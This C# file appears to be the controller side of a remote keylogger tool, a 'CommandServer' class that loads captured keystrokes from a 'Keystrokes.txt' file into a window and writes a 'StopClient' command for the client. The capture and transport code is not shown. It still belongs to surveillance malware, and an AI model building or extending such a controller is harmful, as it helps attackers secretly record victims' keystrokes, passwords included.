﻿using System.IO;
using System.Windows.Forms;

namespace CommandServer
{
    internal class RemoteKeylogger
    {
        public static TextBox tb4 = null;
        public static Button btn9 = null;
        public static Button btn10 = null;

        public static void initRemoteKeylogger(TextBox tb4In, Button btn9In, Button btn10In)
        {
            if (File.Exists("Commands.txt")) File.Delete("Commands.txt");
            tb4 = tb4In;
            btn9 = btn9In;  
            btn10 = btn10In;
        }

        public static void btn9_Click()
        {
            bool bFileExists = File.Exists("Keystrokes.txt");
            if (bFileExists)
            {
                string logContents = File.ReadAllText("Keystrokes.txt");
                tb4.Text = logContents;
            }
        }

        public static void btn10_Click()
        {
            using (StreamWriter sw = File.CreateText("commands.txt"))
            {
                sw.WriteLine("StopClient");
            }
        }
    }
}
